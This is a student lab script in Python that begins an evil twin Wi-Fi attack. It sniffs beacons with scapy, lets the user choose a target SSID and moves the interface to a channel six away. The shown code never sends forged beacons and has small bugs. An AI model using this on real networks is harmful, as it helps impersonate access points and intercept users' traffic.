# SWI - Labo1-MAC1
# Date: 02.03.2020
# File: evil-twin-fake-channel.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# Sources: - https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
#          - https://stackoverflow.com/questions/56644291/trying-to-retrieve-channel-from-802-11-frame-with-scapy
#          - https://github.com/Esser420/EvilTwinFramework

# -*- coding: utf-8 -*-

# Evil twin and fake channel attack
from scapy.all import *
import os

# SSID sniffer
# Based on the code of Adam Ziaja's ssid-sniffer.py (https://github.com/adamziaja/python/blob/master/ssid_sniffer.py)

ssid_list =  [] # List of the ssid in the proximity
interface = "wlan0mon"

def packetHandler(pkt):
    if pkt.haslayer(Dot11Beacon): # 802.11 beacon packets
        try:
            # We make sure to have neither duplicates, nor empty packets in the ssid list
            if(pkt.info not in ssid_list and len(pkt.info) > 0):
                ssid_list.append(pkt)
                # We print the list of retrieved ssids
                for i in range(len(ssid_list)):
                    print(str(i) + ' - ' + str(ssid_list[i].info))
                print("#-------------------------#")
        except AttributeError as e:
                print(e)
                return

# iface: interface to use
# count: number of packet to sniff, 0 is infinity
# prn: callback function
# store: number of packet to store in memory
# timeout: sniffing duration in seconds
sniff(iface=interface, count=0, prn=packetHandler, store=0, timeout=2)

# We ask the user to choose the network to attack
target = int(input("Select a ssid: "))

try:
    # We trust the user to only input a number
    target_pkt = ssid_list[target]

    print("You choose " + str(target_pkt.info))

    # We retrieve the target channel
    target_channel = target_pkt[Dot11Beacon].network_stats().get("channel")
    print("Target channel: " + str(target_channel))

    # We create a new beacon 6 channels away from the target
    new_ch = (target_channel + 6) % 14

    os.system(f"iwconfig {interface} channel {new_ch}")
    
except Exception as ex:
    print(ex)
    pass